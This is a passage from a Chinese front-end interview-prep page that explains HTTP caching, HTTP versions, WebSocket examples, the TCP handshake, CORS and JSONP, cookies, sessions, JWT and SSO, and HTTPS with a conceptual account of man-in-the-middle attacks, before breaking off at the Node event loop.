<li>命中协商缓存，返回<code>304</code>，浏览器直接从缓存中读取资源</li> <li>未命中协商缓存，返回<code>200</code>，浏览器重新请求资源</li></ul></li> <li><strong>强制缓存的流程图</strong> <img alt="" data-src="https://s.poetries.work/uploads/2023/02/cf357b148b63c080.png" loading="lazy" class="lazy"> <img alt="" data-src="https://s.poetries.work/uploads/2023/02/c64e9237d005100c.png" loading="lazy" class="lazy"></li></ul></li> <li><strong>协商缓存</strong> <ul><li>服务端缓存策略</li> <li>服务端判断客户端资源，是否和服务端资源一样</li> <li>如果判断一致则返回<code>304</code>（不在返回<code>js</code>、图片内容等资源），否则返回<code>200</code>和最新资源</li> <li><strong>服务端怎么判断客户端资源一样？</strong> 根据资源标识
<ul><li>在<code>Response Headers</code>中，有两种</li> <li><code>Last-Modified</code>和<code>Etag</code>会优先使用<code>Etag</code>，<code>Last-Modified</code>只能精确到秒级，如果资源被重复生成而内容不变，则<code>Etag</code>更准确</li> <li><code>Last-Modified</code> 服务端返回的资源的最后修改时间
<ul><li><code>If-Modified-Since</code> 客户端请求时，携带的资源的最后修改时间（即<code>Last-Modified</code>的值）
<img alt="" data-src="https://s.poetries.work/uploads/2023/02/282933521c137ef6.png" loading="lazy" class="lazy"></li></ul></li> <li><code>Etag</code>服务端返回的资源的唯一标识（一个字符串，类似指纹）
<ul><li><code>If-None-Matche</code> 客户端请求时，携带的资源的唯一标识（即<code>Etag</code>的值）
<img alt="" data-src="https://s.poetries.work/uploads/2023/02/5410537fc2ebf124.png" loading="lazy" class="lazy"></li></ul></li> <li><strong>Headers示例</strong> <img alt="" data-src="https://s.poetries.work/uploads/2023/02/704949dd8a110763.png" loading="lazy" class="lazy"></li> <li><strong>请求示例</strong> 通过<code>Etag</code>或<code>Last-Modified</code>命中缓存，没有返回资源，返回<code>304</code>，体积非常小
<img alt="" data-src="https://s.poetries.work/uploads/2023/02/8aa4cc91818455d9.png" loading="lazy" class="lazy"></li></ul></li></ul></li> <li><strong>HTTP缓存总结</strong> <img alt="" data-src="https://s.poetries.work/uploads/2023/02/e808802f780e55c9.png" loading="lazy" class="lazy"></li></ul></li> <li><strong>刷新操作方式，对缓存的影响</strong> <ul><li>正常操作：地址栏输入<code>url</code>，跳转链接，前进后退</li> <li>手动操作：<code>F5</code>，点击刷新，右键菜单刷新</li> <li>强制刷新：<code>ctrl + F5</code> 或 <code>command + r</code></li></ul></li> <li><strong>不同刷新操作，不同缓存策略</strong> <ul><li>正常操作：强缓存有效，协商缓存有效</li> <li>手动操作：强缓存失效，协商缓存有效</li> <li>强制刷新：强缓存失效，协商缓存失效</li></ul></li> <li><strong>小结</strong> <ul><li>强缓存<code>Cache-Contorl</code>、<code>Expired</code>（弃用）</li> <li>协商缓存<code>Last-Modified</code>/<code>If-Modified-Since</code>和<code>Etag</code>/<code>If-None-Matche</code>，<code>304</code>状态码</li> <li>完整流程图</li></ul></li></ul> <h3 id="http协议1-0和1-1和2-0有什么区别"><a href="#http协议1-0和1-1和2-0有什么区别" class="header-anchor">#</a> HTTP协议1.0和1.1和2.0有什么区别</h3> <ul><li><strong>HTTP1.0</strong> <ul><li>最基础的<code>HTTP</code>协议</li> <li>支持基本的<code>GET</code>、<code>POST</code>方法</li></ul></li> <li><strong>HTTP1.1</strong> <ul><li>缓存策略 <code>cache-control</code> <code>E-tag</code></li> <li>支持长链接 <code>Connection:keep-alive</code> 一次<code>TCP</code>连接多次请求</li> <li>断点续传，状态码<code>206</code></li> <li>支持新的方法 <code>PUT DELETE</code>等，可用于<code>Restful API</code>写法</li></ul></li> <li><strong>HTTP2.0</strong> <ul><li>可压缩<code>header</code>，减少体积</li> <li>多路复用，一次<code>TCP</code>连接中可以多个<code>HTTP</code>并行请求</li> <li>服务端推送（实际中使用<code>websocket</code>）</li></ul></li></ul> <p><strong>连环问：HTTP协议和UDP协议有什么区别</strong></p> <ul><li><code>HTTP</code>是应用层，<code>TCP</code>、<code>UDP</code>是传输层</li> <li><code>TCP</code>有连接（三次握手），有断开（四次挥手），传输稳定</li> <li><code>UDP</code>无连接，无断开不稳定传输，但效率高。如视频会议、语音通话</li></ul> <h3 id="websocket和http协议有什么区别"><a href="#websocket和http协议有什么区别" class="header-anchor">#</a> WebSocket和HTTP协议有什么区别</h3> <ul><li>支持端对端通信</li> <li>可由<code>client</code>发起，也可由<code>sever</code>发起</li> <li>用于消息通知、直播间讨论区、聊天室、协同编辑</li></ul> <p><strong>WebSocket连接过程</strong></p> <ul><li>先发起一个<code>HTTP</code>请求</li> <li>成功之后在升级到<code>WebSocket</code>协议，再通讯</li></ul> <p><img alt="" data-src="https://s.poetries.work/uploads/2023/01/6772692df973c752.png" loading="lazy" class="lazy"></p> <p><strong>WebSocket和HTTP区别</strong></p> <ul><li><code>WebSocket</code>协议名是<code>ws://</code>，可双端发起请求（双端都可以<code>send</code>、<code>onmessage</code>）</li> <li><code>WebSocket</code>没有跨域限制</li> <li>通过<code>send</code>和<code>onmessage</code>通讯（<code>HTTP</code>通过<code>req</code>、<code>res</code>）</li></ul> <p><strong>WebSocket和HTTP长轮询的区别</strong></p> <blockquote><p>长轮询：一般是由客户端向服务端发出一个设置较长网络超时时间的 <code>HTTP</code> 请求，并在<code>Http</code>连接超时前，不主动断开连接；待客户端超时或有数据返回后，再次建立一个同样的<code>HTTP</code>请求，重复以上过程</p></blockquote> <ul><li><code>HTTP</code>长轮询：客户端发起请求，服务端阻塞，不会立即返回
<ul><li><code>HTTP</code>长轮询需要处理<code>timeout</code>，即<code>timeout</code>之后重新发起请求</li></ul></li> <li><code>WebSocket</code>：客户端可发起请求，服务端也可发起请求</li></ul> <p><strong>ws可升级为wss（像https）</strong></p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">import</span> <span class="token punctuation">{</span>createServer<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'https'</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>readFileSync<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'fs'</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>WebSocketServer<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'ws'</span>

<span class="token keyword">const</span> server <span class="token operator">=</span> <span class="token function">createServer</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  <span class="token literal-property property">cert</span><span class="token operator">:</span> <span class="token function">readFileSync</span><span class="token punctuation">(</span><span class="token string">'/path/to/cert.pem'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
  <span class="token literal-property property">key</span><span class="token operator">:</span> <span class="token function">readFileSync</span><span class="token punctuation">(</span><span class="token string">'/path/to/key.pem'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">const</span> wss <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WebSocketServer</span><span class="token punctuation">(</span><span class="token punctuation">{</span> server <span class="token punctuation">}</span><span class="token punctuation">)</span>
</code></pre></div><p><strong>实际项目中推荐使用socket.io API更简洁</strong></p> <div class="language-js extra-class"><pre class="language-js"><code>io<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'connection'</span><span class="token punctuation">,</span><span class="token parameter">sockert</span><span class="token operator">=&gt;</span><span class="token punctuation">{</span>
  <span class="token comment">// 发送信息</span>
  socket<span class="token punctuation">.</span><span class="token function">emit</span><span class="token punctuation">(</span><span class="token string">'request'</span><span class="token punctuation">,</span> <span class="token comment">/**/</span><span class="token punctuation">)</span>
  <span class="token comment">// 广播事件到客户端</span>
  io<span class="token punctuation">.</span><span class="token function">emit</span><span class="token punctuation">(</span><span class="token string">'broadcast'</span><span class="token punctuation">,</span> <span class="token comment">/**/</span><span class="token punctuation">)</span>
  <span class="token comment">// 监听事件</span>
  socket<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'reply'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span><span class="token punctuation">{</span><span class="token comment">/**/</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
</code></pre></div><p><strong>WebSocket基本使用例子</strong></p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// server.js</span>
<span class="token keyword">const</span> <span class="token punctuation">{</span> WebSocketServer <span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'ws'</span><span class="token punctuation">)</span> <span class="token comment">// npm i ws </span>
<span class="token keyword">const</span> wsServer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WebSocketServer</span><span class="token punctuation">(</span><span class="token punctuation">{</span> <span class="token literal-property property">port</span><span class="token operator">:</span> <span class="token number">3000</span> <span class="token punctuation">}</span><span class="token punctuation">)</span>

wsServer<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'connection'</span><span class="token punctuation">,</span> <span class="token parameter">ws</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">'connected'</span><span class="token punctuation">)</span>

  ws<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'message'</span><span class="token punctuation">,</span> <span class="token parameter">msg</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">'收到了信息'</span><span class="token punctuation">,</span> msg<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token comment">// 服务端向客户端发送信息</span>
    <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
      ws<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'服务端已经收到了信息: '</span> <span class="token operator">+</span> msg<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">2000</span><span class="token punctuation">)</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
</code></pre></div><div class="language-html extra-class"><pre class="language-html"><code><span class="token comment">&lt;!-- websocket main page --&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>btn-send<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>发送消息<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
    <span class="token keyword">const</span> ws <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WebSocket</span><span class="token punctuation">(</span><span class="token string">'ws://127.0.0.1:3000'</span><span class="token punctuation">)</span>
    ws<span class="token punctuation">.</span><span class="token function-variable function">onopen</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
      console<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">'opened'</span><span class="token punctuation">)</span>
      ws<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'client opened'</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span>
    ws<span class="token punctuation">.</span><span class="token function-variable function">onmessage</span> <span class="token operator">=</span> <span class="token parameter">event</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
      console<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">'收到了信息'</span><span class="token punctuation">,</span> event<span class="token punctuation">.</span>data<span class="token punctuation">)</span>
    <span class="token punctuation">}</span>

    document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'btn-send'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'click'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
      console<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">'clicked'</span><span class="token punctuation">)</span>
      ws<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'当前时间'</span> <span class="token operator">+</span> Date<span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><h3 id="请描述tcp三次握手和四次挥手"><a href="#请描述tcp三次握手和四次挥手" class="header-anchor">#</a> 请描述TCP三次握手和四次挥手</h3> <p><strong>建立TCP连接</strong></p> <ul><li>先建立连接，确保双方都有收发消息的能力</li> <li>再传输内容（如发送一个<code>get</code>请求）</li> <li>网络连接是<code>TCP</code>协议，传输内容是<code>HTTP</code>协议</li></ul> <p><strong>三次握手-建立连接</strong></p> <ul><li><code>Client</code>发包，<code>Server</code>接收。<code>Server</code>就知道有<code>Client</code>要找我了</li> <li><code>Server</code>发包，<code>Client</code>接收。<code>Client</code>就知道<code>Server</code>已经收到消息</li> <li><code>Client</code>发包，<code>Server</code>接收。<code>Server</code>就知道<code>Client</code>要准备发送了</li> <li>前两步确定双发都能收发消息，第三步确定双方都准备好了</li></ul> <p><strong>四次挥手-关闭连接</strong></p> <ul><li><code>Client</code>发包，<code>Server</code>接收。<code>Server</code>就知道<code>Client</code>已请求结束</li> <li><code>Server</code>发包，<code>Client</code>接收。<code>Client</code>就知道<code>Server</code>已收到消息，我等待<code>server</code>传输完成了在关闭</li> <li><code>Server</code>发包，<code>Client</code>接收。<code>Client</code>就知道<code>Server</code>已经传输完成了，可以关闭连接了</li> <li><code>Client</code>发包，<code>Server</code>接收。<code>Server</code>就知道<code>Client</code>已经关闭了，<code>Server</code>可以关闭连接了</li></ul> <p><img alt="" data-src="https://s.poetries.work/uploads/2023/01/4c1465795bc8f0c2.png" loading="lazy" class="lazy"> <img alt="" data-src="https://s.poetries.work/uploads/2023/01/0b9d0fa902d5bf1c.png" loading="lazy" class="lazy"></p> <h3 id="http跨域请求时为什么要发送options请求"><a href="#http跨域请求时为什么要发送options请求" class="header-anchor">#</a> HTTP跨域请求时为什么要发送options请求</h3> <p><strong>跨域请求</strong></p> <ul><li>浏览器同源策略</li> <li>同源策略一般限制<code>Ajax</code>网络请求，不能跨域请求<code>server</code></li> <li>不会限制<code>&lt;link&gt;</code> <code>&lt;img&gt;</code> <code>&lt;script&gt;</code> <code>&lt;iframe&gt;</code> 加载第三方资源</li></ul> <p><strong>JSONP实现跨域</strong></p> <div class="language-html extra-class"><pre class="language-html"><code><span class="token comment">&lt;!-- aa.com网页 --&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
  window<span class="token punctuation">.</span><span class="token function-variable function">onSuccess</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>
  <span class="token punctuation">}</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>https://bb.com/api/getData<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// server端https://bb.com/api/getData</span>
<span class="token function">onSuccess</span><span class="token punctuation">(</span><span class="token punctuation">{</span> <span class="token string-property property">&quot;name&quot;</span><span class="token operator">:</span><span class="token string">&quot;test&quot;</span><span class="token punctuation">,</span> <span class="token string-property property">&quot;age&quot;</span><span class="token operator">:</span><span class="token number">12</span><span class="token punctuation">,</span> <span class="token string-property property">&quot;city&quot;</span><span class="token operator">:</span><span class="token string">&quot;shenzhen&quot;</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre></div><p><strong>cors</strong></p> <div class="language-js extra-class"><pre class="language-js"><code>response<span class="token punctuation">.</span><span class="token function">setHeader</span><span class="token punctuation">(</span><span class="token string">'Access-Control-Allow-Origin'</span><span class="token punctuation">,</span> <span class="token string">'https://aa.com'</span><span class="token punctuation">)</span> <span class="token comment">// 或者*</span>
response<span class="token punctuation">.</span><span class="token function">setHeader</span><span class="token punctuation">(</span><span class="token string">'Access-Control-Allow-Methods'</span><span class="token punctuation">,</span> <span class="token string">'GET, POST, PUT, DELETE, OPTIONS'</span><span class="token punctuation">)</span> <span class="token comment">// 允许的请求方法</span>
response<span class="token punctuation">.</span><span class="token function">setHeader</span><span class="token punctuation">(</span><span class="token string">'Access-Control-Allow-Headers'</span><span class="token punctuation">,</span> <span class="token string">'X-Requested-With'</span><span class="token punctuation">)</span> <span class="token comment">// 允许的请求头</span>
response<span class="token punctuation">.</span>setHeader（<span class="token string">'Access-Control-Allow-Credentials'</span><span class="token punctuation">,</span> <span class="token string">'true'</span>）<span class="token comment">// 允许跨域携带cookie</span>
</code></pre></div><p><strong>多余的options请求</strong></p> <p><img alt="" data-src="https://s.poetries.work/uploads/2023/01/8137dab52f536f6d.png" loading="lazy" class="lazy"></p> <ul><li><code>options</code>是跨域请求之前的预检查</li> <li>浏览器自行发起的，无需我们干预</li> <li>不会影响实际的功能</li></ul> <h3 id="http请求中token、cookie、session有什么区别"><a href="#http请求中token、cookie、session有什么区别" class="header-anchor">#</a> HTTP请求中token、cookie、session有什么区别</h3> <p><strong>cookie</strong></p> <ul><li><code>HTTP</code>无状态的，每次请求都要携带<code>cookie</code>,以帮助识别身份</li> <li>服务端也可以向客户端<code>set-cookie</code>,<code>cookie</code>大小<code>4kb</code></li> <li>默认有跨域限制：不可跨域共享，不可跨域传递<code>cookie</code>（可通过设置<code>withCredential</code>跨域传递<code>cookie</code>）</li></ul> <p><strong>cookie本地存储</strong></p> <ul><li><code>HTML5</code>之前<code>cookie</code>常被用于本地存储</li> <li><code>HTML5</code>之后推荐使用<code>localStorage</code>和<code>sessionStorage</code></li></ul> <p><strong>现代浏览器开始禁止第三方cookie</strong></p> <ul><li>和跨域限制不同，这里是：禁止网页引入第三方js设置<code>cookie</code></li> <li>打击第三方广告设置<code>cookie</code></li> <li>可以通过属性设置 <code>SameSite:Strict/Lax/None</code></li></ul> <p><strong>cookie和session</strong></p> <ul><li><code>cookie</code>用于登录验证，存储用户表示（<code>userId</code>）</li> <li><code>session</code>在服务端，存储用户详细信息，和<code>cookie</code>信息一一对应</li> <li><code>cookie+session</code>是常见的登录验证解决方案</li></ul> <p><img alt="" data-src="https://s.poetries.work/uploads/2023/01/bea409a27a4e9ad2.png" loading="lazy" class="lazy"></p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// 登录：用户名 密码</span>
<span class="token comment">// 服务端set-cookie: userId=x1 把用户id传给浏览器存储在cookie中</span>
<span class="token comment">// 下次请求直接带上cookie:userId=x1 服务端根据userId找到哪个用户的信息</span>

<span class="token comment">// 服务端session集中存储所有的用户信息在缓存中</span>
<span class="token keyword">const</span> session <span class="token operator">=</span> <span class="token punctuation">{</span>
  <span class="token literal-property property">x1</span><span class="token operator">:</span> <span class="token punctuation">{</span>
    <span class="token literal-property property">username</span><span class="token operator">:</span><span class="token string">'xx1'</span><span class="token punctuation">,</span>
    <span class="token literal-property property">email</span><span class="token operator">:</span><span class="token string">'xx1'</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span>
  <span class="token literal-property property">x2</span><span class="token operator">:</span> <span class="token punctuation">{</span> <span class="token comment">// 当下次来了一个用户x2也记录x2的登录信息,同时x1也不会丢失</span>
    <span class="token literal-property property">username</span><span class="token operator">:</span><span class="token string">'xx2'</span><span class="token punctuation">,</span>
    <span class="token literal-property property">email</span><span class="token operator">:</span><span class="token string">'xx2'</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span>
<span class="token punctuation">}</span>
</code></pre></div><p><strong>token和cookie</strong></p> <ul><li><code>cookie</code>是<code>HTTP</code>规范（每次请求都会携带），而<code>token</code>是自定义传递</li> <li><code>cookie</code>会默认被浏览器存储，而<code>token</code>需自己存储</li> <li><code>token</code>默认没有跨域限制</li></ul> <p><strong>JWT(json web token)</strong></p> <ul><li>前端发起登录，后端验证成功后，返回一个加密的<code>token</code></li> <li>前端自行存储这个<code>token</code>（其他包含了用户信息，加密的）</li> <li>以后访问服务端接口，都携带着这个<code>token</code>，作为用户信息</li></ul> <p><strong>session和jwt哪个更好？</strong></p> <ul><li><strong>session的优点</strong> <ul><li>用户信息存储在服务端，可快速封禁某个用户</li> <li>占用服务端内存，成本高</li> <li>多进程多服务器时不好同步，需要使用<code>redis</code>缓存</li> <li>默认有跨域限制</li></ul></li> <li><strong>JWT的优点</strong> <ul><li>不占用服务端内存，<code>token</code>存储在客户端浏览器</li> <li>多进程、多服务器不受影响</li> <li>没有跨域限制</li> <li>用户信息存储在客户端，无法快速封禁某用户（可以在服务端建立黑名单，也需要成本）</li> <li>万一服务端密钥被泄露，则用户信息全部丢失</li> <li><code>token</code>体积一般比<code>cookie</code>大，会增加请求的数据量</li></ul></li> <li>如严格管理用户信息（保密、快速封禁）推荐使用<code>session</code></li> <li>没有特殊要求，推荐使用<code>JWT</code></li></ul> <p><strong>如何实现SSO(Single Sign On)单点登录</strong></p> <ul><li><p>单点登录的<code>本质就是在多个应用系统中共享登录状态</code>，如果用户的登录状态是记录在 <code>Session</code> 中的，要实现共享登录状态，就要先共享 <code>Session</code></p></li> <li><p>所以实现单点登录的关键在于，如何让 <code>Session ID</code>（或 <code>Token</code>）在多个域中共享</p></li> <li><p><strong>主域名相同，基于cookie实现单点登录</strong></p> <ul><li><code>cookie</code>默认不可跨域共享，但有些情况下可设置跨域共享</li> <li>主域名相同，如<code>www.baidu.com</code>、<code>image.baidu.com</code></li> <li>设置<code>cookie domain</code>为主域<code>baidu.com</code>，即可共享<code>cookie</code></li> <li>主域名不同，则<code>cookie</code>无法共享。可使用<code>sso</code>技术方案来做</li></ul></li> <li><p><strong>主域名不同，基于SSO技术方案实现</strong></p> <ul><li>系统<code>A</code>、<code>B</code>、<code>SSO</code>域名都是独立的</li> <li>用户访问系统<code>A</code>，系统<code>A</code>重定向到<code>SSO</code>登录（登录页面在<code>SSO</code>）输入用户名密码提交到<code>SSO</code>，验证用户名密码，将登录状态写入<code>SSO</code>的<code>session</code>，同时将<code>token</code>作为参数返回给客户端</li> <li>客户端携带<code>token</code>去访问系统<code>A</code>，系统<code>A</code>携带<code>token</code>去<code>SSO</code>验证，<code>SSO</code>验证通过返回用户信息给系统<code>A</code></li> <li>用户访问<code>B</code>系统，<code>B</code>系统没有登录，重定向到<code>SSO</code>获取<code>token</code>（由于<code>SSO</code>已经登录了，不需要重新登录认证，之前在<code>A</code>系统登录过）,拿着<code>token</code>去<code>B</code>系统，<code>B</code>系统拿着<code>token</code>去<code>SSO</code>里面换取用户信息</li> <li>整个所有用户的登录、用户信息的保存、用户的<code>token</code>验证，全部都在<code>SSO</code>第三方独立的服务中处理</li></ul></li></ul> <p><img alt="" data-src="https://s.poetries.work/uploads/2023/01/428ac761b592fbc1.png" loading="lazy" class="lazy"></p> <h3 id="什么是https中间人攻击-如何预防-https加密过程、原理"><a href="#什么是https中间人攻击-如何预防-https加密过程、原理" class="header-anchor">#</a> 什么是HTTPS中间人攻击，如何预防（HTTPS加密过程、原理）</h3> <p><strong>HTTPS加密传输</strong></p> <ul><li><code>HTTP</code>是明文传输</li> <li><code>HTTPS</code>加密传输 <code>HTTP + TLS/SSL</code></li></ul> <p><strong>TLS 中的加密</strong></p> <ul><li><strong>对称加密</strong> 两边拥有相同的秘钥，两边都知道如何将密文加密解密。</li> <li><strong>非对称加密</strong> 有公钥私钥之分，公钥所有人都可以知道，可以将数据用公钥加密，但是将数据解密必须使用私钥解密，私钥只有分发公钥的一方才知道</li></ul> <p><strong>对称密钥加密和非对称密钥加密它们有什么区别</strong></p> <ul><li>对称密钥加密是最简单的一种加密方式，它的加解密用的都是相同的密钥，这样带来的好处就是加解密效率很快，但是并不安全，如果有人拿到了这把密钥那谁都可以进行解密了。</li> <li>而非对称密钥会有两把密钥，一把是私钥，只有自己才有；一把是公钥，可以发布给任何人。并且加密的内容只有相匹配的密钥才能解。这样带来的一个好处就是能保证传输的内容是安全的，因为例如如果是公钥加密的数据，就算是第三方截取了这个数据但是没有对应的私钥也破解不了。不过它也有缺点，一是公钥因为是公开的，谁都可以过去，如果内容是通过私钥加密的话，那拥有对应公钥的黑客就可以用这个公钥来进行解密得到里面的信息；二来公钥里并没有包含服务器的信息，也就是并不能确保服务器身份的合法性；并且非对称加密的时候要消耗一定的时间，减低了数据的传输效率。</li></ul> <p><strong>HTTPS加密的过程</strong></p> <ol><li>客户端请求<code>www.baidu.com</code></li> <li>服务端存储着公钥和私钥</li> <li>服务器把<code>CA</code>数字证书（包含公钥）响应式给客户端</li> <li>客户端解析证书拿到公钥，并生成随机码<code>KEY</code>（加密的<code>key</code>没有任何意义，如<code>ABC</code>只有服务端的私钥才能解密出来，黑客劫持了<code>KEY</code>也是没用的）</li> <li>客户端把解密后的<code>KEY</code>传递给服务端，作为接下来对称加密的密钥</li> <li>服务端拿私钥解密随机码<code>KEY</code>，使用随机码<code>KEY</code> 对传输数据进行对称加密</li> <li>把对称加密后的内容传输给客户端，客户端使用之前生成的随机码<code>KEY</code>进行解密数据</li></ol> <p><img alt="" data-src="https://s.poetries.work/uploads/2023/01/dd8c1b843050ec62.png" loading="lazy" class="lazy"></p> <p><strong>介绍下https中间人攻击的过程</strong></p> <p>这个问题也可以问成为什么需要CA认证机构颁发证书？</p> <p>我们假设如果不存在认证机构，则人人都可以制造证书，这就带来了&quot;中间人攻击&quot;问题。</p> <p><strong>中间人攻击的过程如下</strong></p> <ul><li>客户端请求被劫持，将所有的请求发送到中间人的服务器</li> <li>中间人服务器返回自己的证书</li> <li>客户端创建随机数，使用中间人证书中的公钥进行加密发送给中间人服务器，中间人使用私钥对随机数解密并构造对称加密，对之后传输的内容进行加密传输</li> <li>中间人通过客户端的随机数对客户端的数据进行解密</li> <li>中间人与服务端建立合法的https连接（https握手过程），与服务端之间使用对称加密进行数据传输，拿到服务端的响应数据，并通过与服务端建立的对称加密的秘钥进行解密</li> <li>中间人再通过与客户端建立的对称加密对响应数据进行加密后传输给客户端</li> <li>客户端通过与中间人建立的对称加密的秘钥对数据进行解密</li></ul> <blockquote><p>简单来说，中间人攻击中，中间人首先伪装成服务端和客户端通信，然后又伪装成客户端和服务端进行通信（如图）。 整个过程中，由于缺少了证书的验证过程，虽然使用了<code>https</code>，但是传输的数据已经被监听，客户端却无法得知</p></blockquote> <p><img alt="" data-src="https://s.poetries.work/gitee/2020/03/1.png" loading="lazy" class="lazy"> <img alt="" data-src="https://s.poetries.work/uploads/2023/01/d007d70173797c88.png" loading="lazy" class="lazy"></p> <p><strong>预防中间人攻击</strong></p> <blockquote><p>使用正规厂商的证书，慎用免费的</p></blockquote> <p><img alt="" data-src="https://s.poetries.work/uploads/2023/01/8cb095d80e81cb18.png" loading="lazy" class="lazy"></p> <h2 id="_10-node"><a href="#_10-node" class="header-anchor">#</a> 10 Node</h2> <h3 id="浏览器和nodejs事件循环-event-loop-有什么区别"><a href="#浏览器和nodejs事件循环-event-loop-有什么区别" class="header-anchor">#</a> 浏览器和nodejs事件循环（Event Loop）有什么区别</h3> <p><strong>单线程和异步</strong></p> <ul><li>JS是单线程的，无论在浏览器还是在nodejs</li> <li>浏览器中JS执行和DOM渲染共用一个线程，是互斥的</li> <li>异步是单线程的解决方案</li></ul> <p><strong>1. 浏览器中的事件循环</strong></p> <p><strong>异步里面分宏任务和微任务</strong></p> <ul><li>宏任务：<code>setTimeout</code>，<code>setInterval</code>，<code>setImmediate</code>，<code>I/O</code>，<code>UI</code>渲染，网络请求</li> <li>微任务：<code>Promise</code>，<code>process.nextTick</code>，<code>MutationObserver</code>、<code>async/await</code></li> <li>宏任务和微任务的区别：微任务的优先级高于宏任务，微任务会在当前宏任务执行完毕后立即执行，而宏任务会在下一个事件循环中执行
